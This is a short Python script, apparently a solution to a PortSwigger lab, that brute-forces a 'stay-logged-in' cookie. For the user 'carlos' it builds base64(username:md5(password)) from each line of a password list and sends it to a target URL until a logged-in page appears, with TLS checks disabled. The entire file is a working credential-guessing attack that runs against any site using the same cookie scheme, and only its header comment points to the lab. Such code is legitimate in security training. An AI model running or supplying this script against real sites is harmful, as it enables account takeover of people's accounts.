# https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie
# The cookie is generate with base64(username:md5(password))

import urllib3
import base64
import sys
import requests
import hashlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


username = "carlos"

def bruteForce(url):

    cookieLoggedIn = ""

    print("[ + ] Finding username...")
    
    usernameFile = open('passwords.txt', 'r')
    linesUsername = usernameFile.read().splitlines()
    for line in linesUsername:

        sys.stdout.write('\r' + "Testing password: " + line)
        print(" "*50, end='\r', flush=True)

        password = username + ":" + hashlib.md5(line.encode()).hexdigest()
        passwordBytes = password.encode('ascii')
        passwordEncoded = base64.b64encode(passwordBytes)
        cookieLoggedIn = passwordEncoded.decode("ascii") 

        print(cookieLoggedIn)

        cookies = {'stay-logged-in': cookieLoggedIn}

        r = requests.get(url, verify=False, proxies=proxies, cookies=cookies)

        if "Update email" in r.text:
                print("\n\n------------------------------------")
                print('\r' + "Cookie found: " + cookieLoggedIn)
                print("Password: " + line)
                print("------------------------------------")
                break

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    bruteForce(url)

if __name__ == "__main__":
    main() 
